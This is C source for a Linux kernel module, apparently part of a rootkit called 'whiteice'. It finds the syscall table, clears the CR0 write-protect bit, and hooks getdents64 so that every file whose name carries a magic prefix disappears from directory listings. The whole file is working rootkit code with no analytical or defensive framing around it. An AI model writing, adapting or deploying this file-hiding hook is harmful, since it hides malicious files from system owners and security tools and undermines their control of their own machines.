#include "defs.h"
#include "hooker.h"

#include <linux/module.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <linux/fdtable.h>
#include <linux/slab.h>

unsigned long **syscall_table;

asmlinkage long (*original_getdents64)(const struct pt_regs *);

asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    long ret = original_getdents64(regs);
    long bpos = 0;
    struct linux_dirent64 *d, *kdir;
    kdir = kzalloc(ret, GFP_KERNEL);
    if (!kdir) return ret;

    if (copy_from_user(kdir, dirent, ret))
        goto end;

    while (bpos < ret) {
        d = (void *)kdir + bpos;
        if (strstr(d->d_name, MAGIC_FILE_PREFIX)) {
            int reclen = d->d_reclen;
            memmove((void *)kdir + bpos, (void *)kdir + bpos + reclen, ret - bpos - reclen);
            ret -= reclen;
            continue;
        }
        bpos += d->d_reclen;
    }

    copy_to_user(dirent, kdir, ret);

end:
    kfree(kdir);
    return ret;
}

int init_hooks(void) {
    syscall_table = (unsigned long **)kallsyms_lookup_name("sys_call_table");
    if (!syscall_table) {
        printk(KERN_ERR "[whiteice:hooker] Unable to locate sys_call_table\n");
        return -1;
    }

    write_cr0(read_cr0() & (~0x10000)); 
    original_getdents64 = (void *)syscall_table[__NR_getdents64];
    syscall_table[__NR_getdents64] = (unsigned long *)hooked_getdents64;
    write_cr0(read_cr0() | 0x10000); 

    printk(KERN_INFO "[whiteice:hooker] getdents64 hooked\n");
    return 0;
}

void cleanup_hooks(void) {
    if (!syscall_table) return;

    write_cr0(read_cr0() & (~0x10000));
    syscall_table[__NR_getdents64] = (unsigned long *)original_getdents64;
    write_cr0(read_cr0() | 0x10000);

    printk(KERN_INFO "[whiteice:hooker] getdents64 restored\n");
}
